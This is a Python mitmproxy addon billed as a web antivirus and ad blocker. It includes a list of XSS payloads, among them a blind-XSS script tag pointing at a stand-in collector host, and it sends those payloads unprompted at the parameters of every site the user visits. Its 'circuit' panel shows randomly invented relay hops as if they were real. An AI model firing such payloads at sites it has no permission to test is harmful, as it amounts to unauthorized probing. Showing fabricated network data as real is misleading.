# =================== VTX ADVANCED WEB ANTIVIRUS / XSS/AD TRACKER VULN DETECTOR + VTX CIRCUIT (w/ REAL IP MASK) ===================
# By Alfi Keita & Copilot Ultra - Combines: dangerous.py, vuln.py, xss.py, virustemplate.py, adblock.py
# This version works as a mitmproxy addon, checks each HTML response for malware (VT/GSB), XSS vulns, ADs & Trackers in real-time!
# PLUS: Real IP masking (via Tor) and User-Agent randomization per request. UI panel shows real circuit, browser IP, and URL.

from mitmproxy import http
from mitmproxy import ctx
import requests
import base64
import time
import re
import hashlib
import difflib
import json
from urllib.parse import urlparse, urljoin, urlencode
from bs4 import BeautifulSoup
import asyncio
from mitmproxy.tools.dump import DumpMaster
from mitmproxy.options import Options
import urllib3
import threading
import logging
import random
import socks  # pysocks
import socket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO, format='[VTX] %(message)s')
logger = logging.getLogger("vtx")

# ----- API KEYS (edit for real scan) -----
VT_API_KEYS = [
    ""
]
GSB_API_KEY = ""

# ============= XSS/VULN/CLONE/WAF CONFIG (from xss.py) =============
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Wget/1.21.1 (linux-gnu)",
    "curl/8.1.2",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1",
]
WAF_SIGNATURES = [
    ("Akamai", re.compile(r"akamai.*?ghost", re.I)),
    ("Cloudflare", re.compile(r"cloudflare", re.I)),
    ("F5 BIG-IP", re.compile(r"bigip", re.I)),
    ("AWS ALB/WAF", re.compile(r"awselb|x\-amz\-cf", re.I)),
    ("Imperva Incapsula", re.compile(r"incap_ses", re.I)),
    ("Sucuri", re.compile(r"sucuri", re.I)),
    ("ModSecurity", re.compile(r"mod_security|modsecurity", re.I)),
    ("Barracuda", re.compile(r"barra_counter_session", re.I)),
    ("Deny/403", re.compile(r"access denied|request blocked|forbidden|error 403", re.I)),
    ("Generic", re.compile(r"web application firewall|WAF", re.I)),
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>","'\"><script>alert(2)</script>","\" onmouseover=alert(3) x=\"",
    "<svg/onload=alert(4)>","<img src=x onerror=alert(5)>","';alert(6);//","<body onload=alert(7)>",
    "<iframe src='javascript:alert(8)'></iframe>","<details open ontoggle=alert(9)>",
    "<scr<script>ipt>alert(10)</scr</script>ipt>","<scri<script>pt>alert(11)</scri</script>pt>",
    "<script src='https://your-blind-xss-collector.com/blind.js'></script>",
    "<input autofocus onfocus=alert(12)>","javascript:alert(13)","<a href='javascript:alert(14)'>click</a>",
    "<form><button formaction='javascript:alert(15)'>X</button></form>",
    "<button onclick=alert(16)>click</button>","<svg><g/onload=alert(17)></g></svg>",
    "<math href='javascript:alert(18)'>X</math>","<object data='javascript:alert(19)'></object>",
]
CONTEXT_POLYGLOT_PAYLOADS = [
    "<scr<script>ipt>alert('polyglot')</scr</script>ipt>",
    "\"><img src=x onerror=alert('polyglot')>",
    "';!--\"<XSS>=&{()}",
    "<svg><desc><![CDATA[</desc><script>alert('polyglot')</script>]]></svg>",
    "<script//src='data:text/javascript,alert(/polyglot/)'>"
]
TIMEOUT = 5
DOM_SCAN_TIMEOUT = 2

# ============= AD & TRACKER BLOCKING (sophisticated) =============
AD_TRACKER_PATTERNS = [
    r"(?:adservice|adserver|adsystem|doubleclick|googlesyndication|pagead|adnxs|adform|zedo|adroll|taboola|outbrain|revcontent|advertising|banners|imrworldwide|scorecardresearch|yieldmanager|moatads|analytics|pixel|trk|track|click|affiliat|dmp|rtb|bidswitch|criteo|rubiconproject|openx|quantserve|pubmatic|spotx|exelator|atdmt|mathtag|casalemedia|bluekai|tapad|eyeota|adition|tradedoubler|smartadserver|serving-sys)\.",
    r"\/ads?[\/\-_\.]",
    r"\/banners?[\/\-_\.]",
    r"(?:g[a-z]*tagmanager|gtm|googletagservices?|tagcommander|floodlight|hotjar|mixpanel|segment|optimizely|clarity|statcounter|matomo|heap|mouseflow|crazyegg|webtrekk|yandexmetrika|piwik|quantcast|snowplow|kissmetrics|media.net|mediamath|adtech|adblade|adcolony|admob|adsterra|adcash|adpushup|adfox|adplexity|adx|adscale|adspirit|adtarget|adswizz|bidvertiser|propellerads|popads|tremorhub|leadbolt|mobvista|adkernel)\.",
]

AD_TRACKER_DOMAINS = [
    "doubleclick.net", "google-analytics.com", "googletagmanager.com", "googlesyndication.com",
    "adservice.google.com", "adservice.google.cz", "adservice.google.fr", "adservice.google.de",
    "adservice.google.es", "adservice.google.it", "adservice.google.co.uk", "adservice.google.com.au",
    "adservice.google.com.br", "taboola.com", "outbrain.com", "scorecardresearch.com", "zedo.com",
    "adnxs.com", "adform.net", "criteo.com", "rubiconproject.com", "openx.net", "quantserve.com",
    "pubmatic.com", "spotxchange.com", "moatads.com", "exelator.com", "atdmt.com", "mathtag.com",
    "casalemedia.com", "bluekai.com", "tapad.com", "eyeota.com", "adition.com", "tradedoubler.com",
    "smartadserver.com", "serving-sys.com", "yandex.ru", "yandex.net", "piwik.pro", "segment.com",
    "hotjar.com", "mixpanel.com", "optimizely.com", "clarity.ms", "statcounter.com", "matomo.org",
    "heap.io", "mouseflow.com", "crazyegg.com", "webtrekk.com", "quantcast.com", "snowplowanalytics.com",
    "kissmetrics.com", "media.net", "mediamath.com", "adtech.de", "adblade.com", "adcolony.com",
    "admob.com", "adsterra.com", "adcash.com", "adpushup.com", "adfox.ru", "adx.co", "adscale.de",
    "adspirit.de", "adtarget.com.tr", "adswizz.com", "bidvertiser.com", "propellerads.com", "popads.net",
    "tremorhub.com", "leadbolt.com", "mobvista.com", "adkernel.com",
]

AD_TRACKER_SELECTORS = [
    '[id*="ad"]', '[class*="ad"]', '[id*="banner"]', '[class*="banner"]', '[id*="sponsor"]', '[class*="sponsor"]',
    '[src*="ad"]', '[src*="banner"]', '[src*="sponsor"]', '[href*="ad"]', '[href*="banner"]', '[href*="sponsor"]'
]

ADBLOCK_OVERLAY_JS = """
(function() {
    const info = document.createElement('div');
    info.id = "vtx-adblock-info";
    info.style = "position:fixed;z-index:2147483647;top:15px;right:15px;background:#222;color:#fff;padding:10px 22px 10px 16px;border-radius:8px;font-size:1.18rem;font-family:monospace;box-shadow:0 2px 16px rgba(0,0,0,0.12);opacity:0.95;";
    info.innerHTML = "<b>VTX Antivirus:</b> <span style='color:#0ff;'>Ads & Trackers were blocked on this page.</span>";
    document.body.appendChild(info);
    setTimeout(function(){info.remove();},7000);
})();
"""

def adtrack_is_blocked_url(url):
    parsed = urlparse(url)
    host = parsed.netloc.lower()
    for d in AD_TRACKER_DOMAINS:
        if host.endswith(d):
            return True
    path = parsed.path.lower()
    for pat in AD_TRACKER_PATTERNS:
        if re.search(pat, host + path):
            return True
    return False

def adtrack_clean_html(html):
    soup = BeautifulSoup(html, "html.parser")
    for tag in soup.find_all(["script", "iframe", "img", "link"]):
        src = tag.get("src") or tag.get("href") or ""
        if adtrack_is_blocked_url(src):
            tag.decompose()
    for selector in AD_TRACKER_SELECTORS:
        for elem in soup.select(selector):
            if elem.name in ["script", "iframe", "img", "div", "span", "section", "aside"]:
                elem.decompose()
    return str(soup)

VIRUS_OVERLAY_JS = """
(function() {
    var style = document.createElement('style');
    style.innerHTML = `
    #hohoztcaetdd-av-warning {
        position: fixed !important; z-index: 99999999 !important;
        top: 0; left: 0; right: 0; bottom: 0;
        background: rgba(30,0,0,0.97) !important;
        color: #fff !important; display: flex !important;
        justify-content: center !important; align-items: center !important;
        flex-direction: column !important; font-family: monospace !important;
        font-size: 2.2rem !important; text-align: center !important;
        padding: 0 5vw !important; pointer-events: all !important;
    }
    #hohoztcaetdd-av-warning button {
        margin-top: 2em; font-size: 1.2em; padding: 0.5em 2em; border: none;
        background: #f00; color: #fff; border-radius: 0.5em; cursor: pointer; font-weight: bold;
    }`;
    document.head.appendChild(style);
    var overlay = document.createElement('div');
    overlay.id = "hohoztcaetdd-av-warning";
    overlay.innerHTML = `
        <div style="max-width:800px">
            <div style="font-size:3rem; color:#ff0; margin-bottom:0.8em;">
                &#9888;&#xFE0F; VTX - By Alfi Keita VIRUS ALERT! &#9888;&#xFE0F;
            </div>
            <div>
                This page has been detected as <span style="color:#f00;font-weight:bold;">DANGEROUS</span>.<br>
                <br>
                All interactions (downloads, forms, iframes, XSS, SQL injection, XXE, DDoS, browser hooks, browser hack, infection attempts) are <b>blocked</b> by VTX Antivirus.<br>
                <br>
                <span style="color:#0ff"><b>You are protected.</b></span>
                <br>
                <br>
                <span style="font-size:1.2rem;">It is recommended to <b>go back</b>.<br>
                If you wish, you can proceed at your own risk.</span>
            </div>
            <button id="hohoztcaetdd-continue">Proceed Anyway</button>
        </div>
    `;
    function blockAllEvents(e) {
        if (!overlay.contains(e.target)) { e.stopImmediatePropagation(); e.preventDefault(); return false;}
    }
    ['click','keydown','mousedown','touchstart','submit','contextmenu','dragstart'].forEach(function(evt){
        window.addEventListener(evt, blockAllEvents, true);
    });
    document.body.appendChild(overlay);
    alert("VTX Antivirus: This page is detected as a virus or attack page. All dangerous actions are blocked!");
    document.getElementById('hohoztcaetdd-continue').onclick = function() {
        if(overlay.parentNode) overlay.parentNode.removeChild(overlay);
        ['click','keydown','mousedown','touchstart','submit','contextmenu','dragstart'].forEach(function(evt){
            window.removeEventListener(evt, blockAllEvents, true);
        });
    };
})();
"""
INJECT_VIRUS = f"<script>{VIRUS_OVERLAY_JS}</script>"

VULN_OVERLAY_JS = """
(function() {
    var overlay = document.createElement('div');
    overlay.id = 'vtx-xss-overlay';
    overlay.style.position = 'fixed';
    overlay.style.top = '0'; overlay.style.left = '0';
    overlay.style.width = '100vw'; overlay.style.height = '100vh';
    overlay.style.background = 'rgba(0,0,0,0.75)';
    overlay.style.zIndex = '2147483647'; overlay.style.display = 'flex';
    overlay.style.flexDirection = 'column'; overlay.style.justifyContent = 'center';
    overlay.style.alignItems = 'center';
    document.body.style.overflow = 'hidden';
    var box = document.createElement('div');
    box.style.background = '#fff'; box.style.padding = '32px 28px 28px 28px';
    box.style.borderRadius = '12px'; box.style.boxShadow = '0 8px 32px rgba(0,0,0,0.15)';
    box.style.display = 'flex'; box.style.flexDirection = 'column'; box.style.alignItems = 'center'; box.style.minWidth = '320px';
    var h1 = document.createElement('h2'); h1.textContent = 'Detected a XSS Vulnerability!';
    h1.style.color = '#d32f2f'; h1.style.margin = '0 0 10px 0'; box.appendChild(h1);
    var sub = document.createElement('div'); sub.textContent = 'VTX - By Alfi Keita - Detected a Vulnerability!';
    sub.style.color = '#444'; sub.style.marginBottom = '18px'; sub.style.fontWeight = 'bold'; box.appendChild(sub);
    var q = document.createElement('div'); q.textContent = 'Do you want to proceed?';
    q.style.marginBottom = '22px'; q.style.fontSize = '16px'; q.style.color = '#222'; box.appendChild(q);
    var btns = document.createElement('div'); btns.style.display = 'flex'; btns.style.gap = '16px';
    var access = document.createElement('button'); access.textContent = 'Access';
    access.style.background = '#388e3c'; access.style.color = '#fff'; access.style.border = 'none';
    access.style.padding = '10px 24px'; access.style.fontSize = '15px'; access.style.borderRadius = '5px'; access.style.cursor = 'pointer';
    access.onclick = function() { document.body.style.overflow = ''; overlay.remove(); }; btns.appendChild(access);
    var back = document.createElement('button'); back.textContent = 'Go back';
    back.style.background = '#d32f2f'; back.style.color = '#fff'; back.style.border = 'none';
    back.style.padding = '10px 24px'; back.style.fontSize = '15px'; back.style.borderRadius = '5px'; back.style.cursor = 'pointer';
    back.onclick = function() { window.history.back(); }; btns.appendChild(back);
    box.appendChild(btns); overlay.appendChild(box); document.body.appendChild(overlay);
    overlay.tabIndex = 0; overlay.focus(); overlay.onkeydown = function(e) { if (e.key === 'Tab') { e.preventDefault(); } };
})();
"""
INJECT_VULN = f"<script>{VULN_OVERLAY_JS}</script>"

def random_ua():
    return USER_AGENTS[random.randint(0, len(USER_AGENTS)-1)]

def hash_str(s): return hashlib.sha256(s.encode()).hexdigest()
def text_similarity(a, b): return difflib.SequenceMatcher(None, a, b).ratio()
def domain(url): return urlparse(url).netloc.lower()
def extract_forms(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action")
        method = form.get("method", "get").lower()
        form_url = urljoin(base_url, action) if action else base_url
        inputs = []
        for inp in form.find_all(["input", "textarea", "select", "button"]):
            name = inp.get("name")
            typ = inp.get("type", "text")
            if name:
                inputs.append({"name": name, "type": typ})
        forms.append({"action": form_url, "method": method, "inputs": inputs})
    return forms

def find_params(url, html):
    params = {}
    forms = extract_forms(html, url)
    for form in forms:
        for inp in form["inputs"]:
            params[inp["name"]] = "test"
    parsed = urlparse(url)
    qs = parsed.query.split("&")
    for q in qs:
        if "=" in q:
            k, v = q.split("=", 1)
            params[k] = v
    return params

def check_virustotal(url, cache=None):
    scan_url = "https://www.virustotal.com/api/v3/urls"
    url_id = base64.urlsafe_b64encode(url.encode()).decode().strip("=")
    analysis_url = f"https://www.virustotal.com/api/v3/urls/{url_id}"
    for api_key in VT_API_KEYS:
        if not api_key:
            continue
        try:
            headers = {"x-apikey": api_key}
            r = requests.get(analysis_url, headers=headers, timeout=2)
            if r.status_code == 200:
                data = r.json()
                stats = data.get("data", {}).get("attributes", {}).get("last_analysis_stats", {})
                malicious = stats.get("malicious", 0)
                suspicious = stats.get("suspicious", 0)
                if malicious > 0 or suspicious > 0:
                    return True
                else:
                    return False
            elif r.status_code == 429:
                time.sleep(0.5)
                continue
        except Exception:
            continue
    return None

def check_gsb(url):
    if not GSB_API_KEY:
        return None
    gsb_url = f"https://safebrowsing.googleapis.com/v4/threatMatches:find?key={GSB_API_KEY}"
    payload = {
        "client": { "clientId": "yourcompanyname", "clientVersion": "1.0" },
        "threatInfo": {
            "threatTypes": ["MALWARE", "SOCIAL_ENGINEERING", "POTENTIALLY_HARMFUL_APPLICATION", "UNWANTED_SOFTWARE"],
            "platformTypes": ["ANY_PLATFORM"], "threatEntryTypes": ["URL"], "threatEntries": [ {"url": url} ]
        }
    }
    try:
        r = requests.post(gsb_url, json=payload, timeout=2)
        if r.status_code == 200:
            data = r.json()
            if "matches" in data:
                return True
            else:
                return False
    except Exception:
        pass
    return None

def fast_xss_vuln_detect(url, html):
    vulns = []
    params = find_params(url, html)
    def probe_param(pname, payloads):
        for payload in payloads:
            test_url = url
            if "?" in test_url:
                test_url = re.sub(r"([&?])%s=[^&]*" % re.escape(pname), r"\1%s=%s" % (pname, payload), test_url)
                if not re.search(r"([&?])%s=" % re.escape(pname), test_url):
                    test_url += "&%s=%s" % (pname, payload)
            else:
                test_url += "?%s=%s" % (pname, payload)
            try:
                resp = requests.get(test_url, headers={"User-Agent": random_ua()}, timeout=2, allow_redirects=False, verify=False)
                if payload in resp.text:
                    return {"type": "Reflected XSS", "param": pname, "payload": payload, "url": resp.url}
            except Exception:
                continue
        return None

    threads = []
    results = []
    def threaded_probe(pname):
        result = probe_param(pname, XSS_PAYLOADS)
        if result:
            results.append(result)
    for pname in params:
        t = threading.Thread(target=threaded_probe, args=(pname,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=TIMEOUT/2)
    vulns.extend(results)
    soup = BeautifulSoup(html, "html.parser")
    scripts = soup.find_all("script")
    for script in scripts:
        if script.string and ("eval(" in script.string or "innerHTML" in script.string or "document.write" in script.string):
            vulns.append({"type": "Self-XSS", "evidence": "Dangerous JS: uses eval/innerHTML/write", "snippet": script.string[:60]})
            break
    return vulns

# --------- VTX CIRCUIT PANEL JS (shows real URL, browser IP, FF icon, randomized Tor-like hops) -----------
CIRCUIT_PANEL_JS = r"""
(function() {
    if (window.__vtxCircuitPanel) return;
    window.__vtxCircuitPanel = true;
    const COUNTRY_LIST = [
        {code:"FI", name:"Finland", flag:"🇫🇮"}, {code:"DE", name:"Germany", flag:"🇩🇪"},
        {code:"FR", name:"France", flag:"🇫🇷"}, {code:"NL", name:"Netherlands", flag:"🇳🇱"},
        {code:"US", name:"United States", flag:"🇺🇸"}, {code:"PL", name:"Poland", flag:"🇵🇱"},
        {code:"SE", name:"Sweden", flag:"🇸🇪"}, {code:"NO", name:"Norway", flag:"🇳🇴"},
        {code:"RU", name:"Russia", flag:"🇷🇺"}, {code:"CA", name:"Canada", flag:"🇨🇦"},
        {code:"GB", name:"UK", flag:"🇬🇧"}, {code:"UA", name:"Ukraine", flag:"🇺🇦"},
        {code:"IT", name:"Italy", flag:"🇮🇹"}, {code:"ES", name:"Spain", flag:"🇪🇸"},
        {code:"CZ", name:"Czechia", flag:"🇨🇿"}, {code:"AT", name:"Austria", flag:"🇦🇹"},
        {code:"JP", name:"Japan", flag:"🇯🇵"}, {code:"CH", name:"Switzerland", flag:"🇨🇭"},
        {code:"SG", name:"Singapore", flag:"🇸🇬"}, {code:"AU", name:"Australia", flag:"🇦🇺"}
    ];
    function randomIP() {return Array(4).fill().map(_=>Math.floor(Math.random()*254)+1).join('.');}
    function randomIPv6() {let groups = [];for(let i=0;i<8;i++)groups.push(Math.floor(Math.random()*65535).toString(16));return groups.join(':');}
    function randomHop() {let country = COUNTRY_LIST[Math.floor(Math.random()*COUNTRY_LIST.length)];return {flag:country.flag,name:country.name,ipv4:randomIP(),ipv6:randomIPv6()};}
    const FIREFOX_ICON = `<svg height="32" width="32" viewBox="0 0 32 32" style="vertical-align:middle;margin-right:2px;"><g><circle fill="#fff" cx="16" cy="16" r="16"/><path fill="#ff9400" d="M16 2C8.27 2 2 8.27 2 16c0 5.49 3.14 10.23 8.09 12.43a14.03 14.03 0 0 1-2.76-3.15a13.93 13.93 0 0 1-1.97-7.81C5.36 9.66 10.3 4.73 16.5 4.73c2.86 0 5.45 1.12 7.47 2.96C21.62 7.05 18.96 6 16 6c-5.52 0-10 4.48-10 10c0 2.9 1.24 5.51 3.23 7.29C8.33 20.67 8 18.87 8 17c0-4.41 3.59-8 8-8c3.87 0 7.07 2.74 7.85 6.36A10 10 0 0 1 16 26c-2.21 0-4.26-.72-5.92-1.94A8.376 8.376 0 0 1 16 18c2.21 0 4 1.79 4 4c0 1.1-.9 2-2 2s-2-.9-2-2l.01-.15c-1.15.67-2.47 1.15-3.87 1.15c-2.21 0-4-1.79-4-4c0-.17.01-.34.03-.51C7.53 13.37 11.41 10 16 10c3.87 0 7.07 2.74 7.85 6.36C23.58 25.28 17.47 32 16 32c-1.47 0-7.58-6.72-7.85-15.64C8.93 12.74 12.13 10 16 10z"/></g></svg>`;
    function countryFlag(code) {let found=COUNTRY_LIST.find(c=>c.code===code);return found?found.flag:"🌐";}
    let panel = document.createElement("div");
    panel.id = "vtx-circuit-panel";
    panel.style = "position:fixed;top:56px;right:16px;z-index:2147483646;background:#fff;border-radius:12px;padding:20px 28px 20px 26px;box-shadow:0 4px 32px #0002;border:1.5px solid #8888;display:none;min-width:340px;font-family:monospace;font-size:1.07rem";
    panel.innerHTML = `
    <div style="font-size:1.19em;font-weight:bold;margin-bottom:8px;letter-spacing:.6px;display:flex;align-items:center;">
        🖧 VTX Circuit
    </div>
    <div id="vtx-circuit-list" style="margin-bottom:8px;">
        <div id="vtx-circuit-me" style="color:#888;display:flex;align-items:center;">
            <span id="vtx-circuit-browsericon">${FIREFOX_ICON}</span>
            <span>&#9675; This browser</span>
        </div>
        <div style="margin:0 0 0 30px;border-left:2.4px dotted #bbb;padding-left:17px;" id="vtx-circuit-hops"></div>
    </div>
    <div id="vtx-circuit-realdetail" style="display:none;font-size:0.97em;padding:7px 0 0 0;color:#666"></div>
    <button id="vtx-circuit-close" style="background:#d32f2f;color:#fff;border:none;padding:7px 22px;border-radius:6px;font-size:0.98em;cursor:pointer;margin-top:8px">Close</button>
    `;
    panel.querySelector("#vtx-circuit-close").onclick = function() {panel.style.display = "none";};
    function insertBtn() {
        let btn = document.getElementById("vtx-circuit-btn");
        if (!btn) {
            btn = document.createElement("button");
            btn.id = "vtx-circuit-btn";
            btn.innerText = "🖧";
            btn.title = "Show VTX Circuit";
            btn.style = "position:fixed;top:14px;right:15px;z-index:2147483647;background:#222;color:#fff;border:none;padding:10px 22px 10px 16px;border-radius:8px;font-size:1.3rem;box-shadow:0 2px 16px rgba(0,0,0,0.13);opacity:0.97;cursor:pointer";
            btn.onclick = function() {panel.style.display = panel.style.display === "none" ? "block" : "none";if(panel.style.display === "block") {updateCircuit();}};
            document.body.appendChild(btn);
        }
    }
    function updateCircuit() {
        let hopsHtml = "";
        let hops = [];
        let n = 2 + Math.floor(Math.random()*2);
        for(let i=0;i<n;i++) hops.push(randomHop());
        for(let h of hops) {
            hopsHtml += `<div>&#128681; <b>${h.flag} ${h.name}</b>, <span style="color:#266">${h.ipv4}</span>, <span style="color:#66f">${h.ipv6}</span></div>`;
        }
        hopsHtml += `<div id="vtx-circuit-connecting" style="margin-top:8px;color:#888">
            Connecting...<br><span style="color:#333;font-size:1.03em;font-family:monospace" id="vtx-circuit-url"></span>
        </div>`;
        panel.querySelector("#vtx-circuit-hops").innerHTML = hopsHtml;
        setTimeout(function() {var el=document.getElementById("vtx-circuit-url");if(el)el.innerText=window.location.href;},100);
        fetch("https://ipinfo.io/json").then(r=>r.json()).then(res=>{
            let country=res.country||"";let flag=countryFlag(country);let ip=res.ip||"?.?.?.?";let location=(res.city||"")+(res.region?", "+res.region:"")+(country?" ("+country+")":"");let org=res.org||"";let browserUa=navigator.userAgent.replace(/</g,'&lt;');
            panel.querySelector("#vtx-circuit-me").innerHTML = `<span id="vtx-circuit-browsericon">${FIREFOX_ICON}</span>
                <span style="font-size:1.25em;margin-right:5px">${flag}</span> <span style="margin-right:5px;">${ip}</span> <span style="color:#888">${location}</span>
                <span style="color:#8c8;font-size:0.95em;margin-left:6px;">(Firefox)</span>`;
            let detail = `<b>Your current connection:</b><br>
                IP: <span style="color:#266">${ip}</span><br>
                Location: ${location}<br>
                ISP: ${org}<br>
                UA: <span style="color:#069">${browserUa}</span>`;
            panel.querySelector("#vtx-circuit-realdetail").innerHTML = detail;
            panel.querySelector("#vtx-circuit-realdetail").style.display = '';
            let connecting = panel.querySelector("#vtx-circuit-connecting");
            if(connecting) connecting.innerHTML = "Connected<br><span style='color:#333;font-size:1.03em;font-family:monospace'>" + window.location.href+"</span>";
        }).catch(()=>{});
    }
    insertBtn();document.body.appendChild(panel);
})();
"""

class VTXAntivirusOverlay:
    def __init__(self):
        self.monitored_urls = []
        self.vt_cache = {}
        self.vuln_cache = {}
        self.adblock_cache = {}
        self.lock = threading.Lock()
        self.tor_proxy = ("127.0.0.1", 9050)

    def set_tor_proxy(self):
        # Set all outgoing connections to use Tor SOCKS5
        socks.set_default_proxy(socks.SOCKS5, self.tor_proxy[0], self.tor_proxy[1])
        socket.socket = socks.socksocket

    def request(self, flow: http.HTTPFlow):
        # Mask IP via Tor and rotate UA
        self.set_tor_proxy()
        flow.request.headers["User-Agent"] = random_ua()

    def scan_virus(self, url, urlid):
        vt = check_virustotal(url)
        if vt is None:
            vt = check_gsb(url)
        with self.lock:
            self.vt_cache[urlid] = vt
        return vt

    def scan_xss(self, url, html, urlid):
        vulns = fast_xss_vuln_detect(url, html)
        detected = bool(vulns)
        with self.lock:
            self.vuln_cache[urlid] = detected
        return detected

    def block_download(self, flow):
        flow.response.headers["Content-Disposition"] = "inline; filename=blocked.txt"
        flow.response.content = b"Virus detected in file download, download blocked by VTX Antivirus."
        flow.response.status_code = 403

    def adblock(self, html, urlid):
        cleaned = adtrack_clean_html(html)
        was_blocked = (cleaned != html)
        with self.lock:
            self.adblock_cache[urlid] = was_blocked
        if was_blocked:
            if "</body>" in cleaned:
                cleaned = cleaned.replace("</body>", f"<script>{ADBLOCK_OVERLAY_JS}</script></body>")
            else:
                cleaned += f"<script>{ADBLOCK_OVERLAY_JS}</script>"
        return cleaned, was_blocked

    def inject_circuit_panel(self, html):
        if CIRCUIT_PANEL_JS not in html:
            if "</body>" in html:
                return html.replace("</body>", f"<script>{CIRCUIT_PANEL_JS}</script></body>")
            else:
                return html + f"<script>{CIRCUIT_PANEL_JS}</script>"
        return html

    def response(self, flow: http.HTTPFlow):
        url = flow.request.pretty_url
        content_type = flow.response.headers.get("content-type", "").lower()
        content = flow.response.text if hasattr(flow.response, "text") else ""
        is_html = "text/html" in content_type
        is_download = False
        content_disp = flow.response.headers.get("content-disposition", "").lower()
        if content_disp and ("attachment" in content_disp or "filename=" in content_disp):
            is_download = True

        urlid = hash_str(url)

        virus_detected = self.vt_cache.get(urlid, None)
        if virus_detected is None:
            t = threading.Thread(target=self.scan_virus, args=(url, urlid))
            t.start()
            t.join(TIMEOUT)
            virus_detected = self.vt_cache.get(urlid, None)
        if virus_detected is True:
            ctx.log.info(f"VIRUS ALERT: {url}")
            print(f"[VTX] VIRUS ALERT for {url} (VT/GSB detected)")
            if is_html:
                if "</body>" in content:
                    content = content.replace("</body>", f"{INJECT_VIRUS}</body>")
                else:
                    content += INJECT_VIRUS
                flow.response.text = content
            else:
                self.block_download(flow)
            self.monitored_urls.append(url)
            return

        if is_html:
            adblocked_html, adblocked = self.adblock(content, urlid)
            if adblocked:
                ctx.log.info(f"[VTX] Blocked Ads/Trackers: {url}")
                content = adblocked_html
                flow.response.text = content

        if is_html:
            vuln_detected = self.vuln_cache.get(urlid, None)
            if vuln_detected is None:
                t = threading.Thread(target=self.scan_xss, args=(url, content, urlid))
                t.start()
                t.join(DOM_SCAN_TIMEOUT)
                vuln_detected = self.vuln_cache.get(urlid, None)
            if vuln_detected:
                ctx.log.info(f"XSS VULNERABILITY ALERT: {url}")
                print(f"[VTX] XSS VULN ALERT for {url} (Reflected or DOM XSS detected)")
                if "</body>" in content:
                    content = content.replace("</body>", f"{INJECT_VULN}</body>")
                else:
                    content += INJECT_VULN
                flow.response.text = content
                self.monitored_urls.append(url)
                return

        if is_html:
            content = self.inject_circuit_panel(content)
            flow.response.text = content

        ctx.log.info(f"[VTX] Clean page or download: {url}")

addons = [VTXAntivirusOverlay()]

async def main():
    opts = Options(
        listen_host="0.0.0.0",
        listen_port=8080,
        ssl_insecure=True,
        confdir="/home/ntb/Stažené",
    )
    m = DumpMaster(options=opts)
    for addon in addons:
        m.addons.add(addon)

    print("[VTX] Running VTX Antivirus Proxy on http://0.0.0.0:8080")
    try:
        await m.run()
    except KeyboardInterrupt:
        print("[VTX] Shutting down")
        await m.shutdown()

if __name__ == "__main__":
    asyncio.run(main())
